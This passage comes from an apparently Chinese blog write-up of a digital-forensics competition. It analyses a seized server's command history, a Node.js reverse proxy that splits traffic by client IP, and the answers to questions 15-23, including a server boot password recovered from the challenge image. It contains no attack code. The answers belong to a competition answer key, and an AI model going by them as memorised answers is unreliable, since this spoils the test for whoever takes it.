--add-port=80/tcp --permanent  <span class="comment"># 永久添加80端口到防火墙</span></span><br><span class="line">  154  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">  155  ping 192.168.110.111  <span class="comment"># 测试连接到指定IP</span></span><br><span class="line">  156  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">  157  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  158  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  159  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  160  firewall-cmd --add-port=80/tcp --permanent  <span class="comment"># 永久添加80端口</span></span><br><span class="line">  161  systemctl stop firewalld  <span class="comment"># 停止防火墙服务</span></span><br><span class="line">  162  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  163  LS  <span class="comment"># 错误命令，应该是ls（大写）</span></span><br><span class="line">  164  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  165  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  166  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  167  <span class="built_in">cd</span> logs/  <span class="comment"># 进入日志目录</span></span><br><span class="line">  168  <span class="built_in">ls</span>  <span class="comment"># 查看日志文件</span></span><br><span class="line">  169  more 2021-4-23-6-34.<span class="built_in">log</span>  <span class="comment"># 查看指定日志文件</span></span><br><span class="line">  170  more 2021-4-23-6-31.<span class="built_in">log</span>  <span class="comment"># 查看另一个日志文件</span></span><br><span class="line">  171  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  172  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  173  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  174  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  175  vim /etc/hosts  <span class="comment"># 编辑主机名解析文件</span></span><br><span class="line">  176  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  177  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  178  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  179  node app.js  <span class="comment"># 启动Node.js应用</span></span><br><span class="line">  180  reboot  <span class="comment"># 重启系统</span></span><br><span class="line">  181  <span class="built_in">cd</span> /opt  <span class="comment"># 进入/opt目录</span></span><br><span class="line">  182  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  183  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  184  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  185  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  186  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  187  node app.js  <span class="comment"># 启动Node.js应用</span></span><br><span class="line">  188  <span class="built_in">history</span>  <span class="comment"># 显示命令历史</span></span><br><span class="line">  189  <span class="built_in">cd</span> /opt/  <span class="comment"># 进入/opt目录</span></span><br><span class="line">  190  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  191  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  192  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  193  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  194  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  195  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  196  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  197  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  198  <span class="built_in">cd</span> logs/  <span class="comment"># 进入日志目录</span></span><br><span class="line">  199  l;s  <span class="comment"># 错误命令，应该是ls</span></span><br><span class="line">  200  <span class="built_in">ls</span>  <span class="comment"># 查看日志文件</span></span><br><span class="line">  201  ll  <span class="comment"># 显示详细文件列表（ls -l的别名）</span></span><br><span class="line">  202  vim 2021-4-23-17-36.<span class="built_in">log</span>  <span class="comment"># 编辑日志文件</span></span><br><span class="line">  203  <span class="built_in">cd</span> /opt/  <span class="comment"># 进入/opt目录</span></span><br><span class="line">  204  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  205  <span class="built_in">cd</span> honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  206  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  207  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  208  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  209  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  210  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  211  vim ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  212  <span class="built_in">history</span>  <span class="comment"># 显示命令历史</span></span><br><span class="line">  213  reboot  <span class="comment"># 重启系统</span></span><br><span class="line">  214  <span class="built_in">cd</span> /opt/honglianjingsai/  <span class="comment"># 进入红莲竞赛目录</span></span><br><span class="line">  215  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  216  <span class="built_in">cd</span> chronusNode/  <span class="comment"># 进入chronusNode目录</span></span><br><span class="line">  217  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  218  <span class="built_in">cd</span> logs  <span class="comment"># 进入日志目录</span></span><br><span class="line">  219  <span class="built_in">ls</span> -la  <span class="comment"># 以长格式显示所有文件（包括隐藏文件）</span></span><br><span class="line">  220  <span class="built_in">cat</span> 2021-4-23-6-53.<span class="built_in">log</span>  <span class="comment"># 查看日志文件内容</span></span><br><span class="line">  221  <span class="built_in">cat</span> 2021-4-23-17-39.<span class="built_in">log</span>  <span class="comment"># 查看另一个日志文件内容</span></span><br><span class="line">  222  <span class="built_in">date</span>  <span class="comment"># 显示当前日期时间</span></span><br><span class="line">  223  systemctl start firewalld  <span class="comment"># 启动防火墙服务</span></span><br><span class="line">  224  firewall-cmd --add-port 80/tcp  <span class="comment"># 添加80端口到防火墙</span></span><br><span class="line">  225  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  226  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  227  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  228  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  229  vi ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  230  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  231  vi ADTCPDeliver.js  <span class="comment"># 编辑TCP传输控制器文件</span></span><br><span class="line">  232  vi ADFileServer.js  <span class="comment"># 编辑文件服务器控制器文件</span></span><br><span class="line">  233  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  234  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  235  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  236  vi app.js  <span class="comment"># 编辑主应用文件</span></span><br><span class="line">  237  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  238  <span class="built_in">cd</span> controller/  <span class="comment"># 进入控制器目录</span></span><br><span class="line">  239  <span class="built_in">ls</span>  <span class="comment"># 查看控制器文件</span></span><br><span class="line">  240  vi ADProxy.js  <span class="comment"># 编辑ADProxy.js文件</span></span><br><span class="line">  241  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  242  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  243  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  244  <span class="built_in">cd</span> model/  <span class="comment"># 进入模型目录</span></span><br><span class="line">  245  <span class="built_in">ls</span>  <span class="comment"># 查看模型文件</span></span><br><span class="line">  246  <span class="built_in">cd</span> ..  <span class="comment"># 返回上级目录</span></span><br><span class="line">  247  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  248  <span class="built_in">cd</span> node_modules/  <span class="comment"># 进入Node.js模块目录</span></span><br><span class="line">  249  <span class="built_in">ls</span>  <span class="comment"># 查看模块文件</span></span><br><span class="line">  250  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">  251  reboot  <span class="comment"># 重启系统</span></span><br><span class="line">  252  clear  <span class="comment"># 清屏</span></span><br><span class="line">  253  <span class="built_in">cd</span> /opt/honglianjingsai/chronusNode/  <span class="comment"># 进入应用目录</span></span><br><span class="line">  254  <span class="built_in">ls</span>  <span class="comment"># 查看目录内容</span></span><br><span class="line">  255  <span class="built_in">cd</span> logs/  <span class="comment"># 进入日志目录</span></span><br><span class="line">  256  <span class="built_in">ls</span>  <span class="comment"># 查看日志文件</span></span><br><span class="line">  257  <span class="built_in">ls</span> -la  <span class="comment"># 以长格式显示所有文件</span></span><br><span class="line">  258  <span class="built_in">cd</span> .  <span class="comment"># 停留在当前目录</span></span><br><span class="line">  259  <span class="built_in">ls</span>  <span class="comment"># 查看文件</span></span><br><span class="line">  260  <span class="built_in">ls</span> -la  <span class="comment"># 以长格式显示所有文件</span></span><br><span class="line">  261  <span class="built_in">date</span>  <span class="comment"># 显示当前日期时间</span></span><br><span class="line">  262  vim 2021-4-23-18-59.<span class="built_in">log</span>  <span class="comment"># 编辑日志文件</span></span><br><span class="line">  263  <span class="built_in">date</span>  <span class="comment"># 显示当前日期时间</span></span><br><span class="line">  264  timedatectl  <span class="comment"># 显示系统时间设置</span></span><br><span class="line">  265  timedatectl set-timezone UTC  <span class="comment"># 设置时区为UTC</span></span><br><span class="line">  266  timedatectl  <span class="comment"># 确认时区设置</span></span><br><span class="line">  267  <span class="built_in">date</span>  <span class="comment"># 显示当前日期时间</span></span><br><span class="line">  268  <span class="built_in">ls</span>  <span class="comment"># 查看当前目录</span></span><br><span class="line">  269  last  <span class="comment"># 显示最近登录用户</span></span><br><span class="line">  270  clear  <span class="comment"># 清屏</span></span><br><span class="line">  271  ififconfigiig  <span class="comment"># 错误命令，应该是ifconfig</span></span><br><span class="line">  272  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">  273  reboot  <span class="comment"># 重启系统</span></span><br><span class="line">  274  clear  <span class="comment"># 清屏</span></span><br><span class="line">  275  ifconfig  <span class="comment"># 显示网络接口配置</span></span><br><span class="line">  276  ifconfig  <span class="comment"># 再次显示网络接口配置</span></span><br><span class="line">  277  <span class="built_in">cd</span> /opt/honglianjingsai/chronusNode/  <span class="comment"># 进入应用目录</span></span><br><span class="line">  278  node app.js  <span class="comment"># 启动Node.js应用</span></span><br><span class="line">  279  shutdown -r now  <span class="comment"># 立即重启系统</span></span><br><span class="line">  280  <span class="built_in">history</span>  <span class="comment"># 显示完整的命令历史</span></span><br></pre></td></tr></table></figure><ul><li>操作</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ccj]# <span class="built_in">cd</span> /opt/</span><br><span class="line">[root@localhost opt]# <span class="built_in">cd</span> honglianjingsai/</span><br><span class="line">[root@localhost honglianjingsai]# <span class="built_in">ls</span></span><br><span class="line">chronusNode  node-v14.16.1-linux-x64.tar.xz  README.txt</span><br><span class="line">[root@localhost honglianjingsai]# vi README.txt</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-1.png" alt="alt text"></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可</span><br><span class="line">修改反向代理目标地址在目录chronusNode/controller/ADProxy.js下修改函数service即可</span><br></pre></td></tr></table></figure><ul><li>找到ADProxy.js路径，打开如下：</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反向代理</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">_brain, _app</span>) &#123;</span><br><span class="line">    <span class="comment">/* INCLUDE */</span></span><br><span class="line">    <span class="keyword">const</span> path = _brain.<span class="property">A</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">async</span> = _brain.<span class="property">A</span>.<span class="property">async</span>;</span><br><span class="line">    <span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy-middleware&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line">    <span class="comment">/* DEFINE */</span></span><br><span class="line">    <span class="keyword">const</span> _tag = path.<span class="title function_">basename</span>(__filename, <span class="string">&quot;.js&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> _isBanned = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> _isStarted = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(!_brain.<span class="property">A</span>.<span class="title function_">checkIsNull</span>(_brain.<span class="property">C</span>.<span class="property">autorun_config</span>[_tag], _tag))&#123;</span><br><span class="line">        _isStarted = _brain.<span class="property">C</span>.<span class="property">autorun_config</span>[_tag];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* DEFINE PROXY */</span></span><br><span class="line">    <span class="keyword">const</span> _proxy50 = &#123;</span><br><span class="line">        <span class="attr">protocol</span>: <span class="string">&#x27;http:&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;192.168.110.111&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> _proxy100 = &#123;</span><br><span class="line">        <span class="attr">protocol</span>: <span class="string">&#x27;http:&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;192.168.110.112&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> _proxy100p = &#123;</span><br><span class="line">        <span class="attr">protocol</span>: <span class="string">&#x27;http:&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;192.168.110.113&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*明确配置了3个后端服务器，这是负载均衡的典型特征！！！*/</span></span><br><span class="line">    <span class="comment">/* Private Function */</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Service Running</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> service = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!_isStarted) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// proxy middleware options</span></span><br><span class="line">        <span class="keyword">const</span> _proxyer_chronus = <span class="title function_">proxy</span>(&#123;</span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;/&#x27;</span>, <span class="comment">// target host</span></span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span>,               <span class="comment">// needed for virtual hosted sites</span></span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,                          <span class="comment">// proxy websockets</span></span><br><span class="line">            <span class="attr">router</span>: <span class="keyword">function</span>(<span class="params">req</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> clientIP = req.<span class="title function_">get</span>(<span class="string">&quot;x-forwarded-for&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (clientIP == <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    clientIP = req.<span class="property">connection</span>.<span class="property">remoteAddress</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> clientIPArr = clientIP.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (clientIPArr.<span class="property">length</span> == <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> clientIP3Int = <span class="built_in">parseInt</span>(clientIPArr[<span class="number">2</span>])</span><br><span class="line">                    <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_RequestHeader] -&gt; &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">headers</span>));</span><br><span class="line">                    <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_ClientIP] -&gt; &#x27;</span> + clientIP);</span><br><span class="line"> <span class="comment">// 基于IP第三段的分流逻辑</span></span><br><span class="line">                    <span class="keyword">if</span> (clientIP3Int &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">                        <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_proxy50));</span><br><span class="line">                        <span class="keyword">return</span> _proxy50</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clientIP3Int &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">                        <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_proxy100));</span><br><span class="line">                        <span class="keyword">return</span> _proxy100</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_proxy100p));</span><br><span class="line">                        <span class="keyword">return</span> _proxy100p</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        _app.<span class="title function_">all</span>(<span class="string">&#x27;/*&#x27;</span>, _proxyer_chronus);<span class="comment">// 所有请求都经过代理</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Service Killing</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">var</span> serviceKiller = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Public Function */</span></span><br><span class="line">    <span class="comment">/* 返回_tag */</span></span><br><span class="line">    <span class="keyword">var</span> getTag = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> _tag;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/* 判断服务是否开启 */</span></span><br><span class="line">    <span class="keyword">var</span> isStarted = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> _isStarted;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/* 判断服务是否被意外禁止 */</span></span><br><span class="line">    <span class="keyword">var</span> isBanned = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> _isBanned;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 服务开关 */</span></span><br><span class="line">    <span class="keyword">var</span> startServer = <span class="keyword">function</span> (<span class="params">callBack</span>)&#123;</span><br><span class="line">        _isStarted = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">service</span>();</span><br><span class="line">        <span class="keyword">if</span>(callBack)</span><br><span class="line">            <span class="title function_">callBack</span>(<span class="number">100</span>, _tag + <span class="string">&#x27; Started&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> stopServer = <span class="keyword">function</span> (<span class="params">callBack</span>)&#123;</span><br><span class="line">        _isStarted = <span class="literal">false</span>;</span><br><span class="line">        <span class="title function_">serviceKiller</span>();</span><br><span class="line">        <span class="keyword">if</span>(callBack)</span><br><span class="line">            <span class="title function_">callBack</span>(<span class="number">100</span>, _tag + <span class="string">&#x27; Stopped&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Service AutoRun */</span></span><br><span class="line">    <span class="keyword">if</span>(_isStarted)&#123;</span><br><span class="line">        <span class="title function_">startServer</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">stopServer</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        getTag             : getTag,</span><br><span class="line">        isStarted          : isStarted,</span><br><span class="line">        isBanned           : isBanned,</span><br><span class="line">        startServer        : startServer,</span><br><span class="line">        stopServer         : stopServer,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>作用：负载均衡</li></ul><h4 id="15-上一题中，提到的主要功能对应的服务监听的端口为："><a class="header-anchor" href="#15-上一题中，提到的主要功能对应的服务监听的端口为：">¶</a>15. 上一题中，提到的主要功能对应的服务监听的端口为：</h4><ul><li>上面README.txt中有：修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可</li><li>打开const.js，寻找参数server_config/port</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 服务器基本配置 */</span></span><br><span class="line">server_config : &#123;</span><br><span class="line">    host : <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    port : <span class="number">80</span>,</span><br><span class="line">    safe_port : <span class="number">8443</span>,</span><br><span class="line">    static_path : <span class="string">&#x27;static&#x27;</span>,</span><br><span class="line">    static_host : <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>答案：80</li></ul><h4 id="16-上一题中，提到的服务所使用的启动命令为："><a class="header-anchor" href="#16-上一题中，提到的服务所使用的启动命令为：">¶</a>16. 上一题中，提到的服务所使用的启动命令为：</h4><ul><li>最开始历史命令可以看到：node app.js  # 启动Node.js应用</li></ul><h4 id="17-经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】"><a class="header-anchor" href="#17-经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】">¶</a>17. 经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> clientIPArr = clientIP.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)  <span class="comment">// 将IP按点号分割成数组</span></span><br><span class="line"><span class="keyword">if</span> (clientIPArr.<span class="property">length</span> == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clientIP3Int = <span class="built_in">parseInt</span>(clientIPArr[<span class="number">2</span>])  <span class="comment">// 提取第三段并转为整数</span></span><br><span class="line">    <span class="comment">//                      ↑</span></span><br><span class="line">    <span class="comment">//                  数组索引2对应第三段</span></span><br><span class="line">    <span class="comment">// 数组索引: [0]    [1]    [2]    [3]</span></span><br><span class="line">    <span class="comment">// IP示例:  192  . 168  . 110  . 111</span></span><br><span class="line">    <span class="comment">//          第一段  第二段  第三段  第四段</span></span><br></pre></td></tr></table></figure><h4 id="18-经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111-111-111-111】"><a class="header-anchor" href="#18-经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111-111-111-111】">¶</a>18. 经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clientIP3Int &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">    <span class="variable language_">global</span>.<span class="property">logger</span>.<span class="title function_">warn</span>(<span class="string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_proxy50));</span><br><span class="line">    <span class="keyword">return</span> _proxy50</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DEFINE PROXY */</span></span><br><span class="line"><span class="keyword">const</span> _proxy50 = &#123;</span><br><span class="line">    <span class="attr">protocol</span>: <span class="string">&#x27;http:&#x27;</span>,</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;192.168.110.111&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="19-请分析，该服务器转发的目标服务器一共有几台【标准格式：9】"><a class="header-anchor" href="#19-请分析，该服务器转发的目标服务器一共有几台【标准格式：9】">¶</a>19. 请分析，该服务器转发的目标服务器一共有几台【标准格式：9】</h4><ul><li>3</li></ul><h4 id="20-请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111-111-111-111】【待-问题未解答】"><a class="header-anchor" href="#20-请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111-111-111-111】【待-问题未解答】">¶</a>20. 请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】【待 问题未解答】</h4><ul><li>问题：1怎么知道是红米的那个2wp里面的诡异时间点是怎么出来的3文件导不出来</li><li>报警时间：2021年4月25日，上午8点左右</li><li>在日志中注意时间是UTC时间，所以日志减8去对应报警时间和作案时间</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-2.png" alt="alt text"></p><ul><li>一直访问内网192.168.110.110，所以是本地嫌疑人ip：192.168.110.203</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-3.png" alt="alt text"></p><ul><li>对应时间找到ip</li></ul><h4 id="21-请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111-111-111-111】"><a class="header-anchor" href="#21-请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111-111-111-111】">¶</a>21. 请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111.111.111.111】</h4><ul><li>不管谁都是转发到192.168.110.113</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-4.png" alt="alt text"></p><h3 id="通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像–检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题："><a class="header-anchor" href="#通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像–检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题：">¶</a>通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像–检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题：</h3><h4 id="22-检材三的原始硬盘的SHA256值为：【待-问题未解答】"><a class="header-anchor" href="#22-检材三的原始硬盘的SHA256值为：【待-问题未解答】">¶</a>22. 检材三的原始硬盘的SHA256值为：【待 问题未解答】</h4><ul><li>问题：1怎么知道是web3哇</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-5.png" alt="alt text"></p><h4 id="23-请分析第21题中，所指的服务器的开机密码为："><a class="header-anchor" href="#23-请分析第21题中，所指的服务器的开机密码为：">¶</a>23. 请分析第21题中，所指的服务器的开机密码为：</h4><ul><li>检材四 嫌疑人的PC端的Xshell中看到连接记录</li><li>选择原因：看负责转发的服务器B的密码看转发对象CDE的账密是经验之谈，而不是规律</li><li>但这个是选择的直接证据：没有看到192.168.110.110被转发信息</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-11.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-10.png" alt="alt text"></p><ul><li>honglian7001</li></ul><h4 id="24-嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为："><a class="header-anchor" 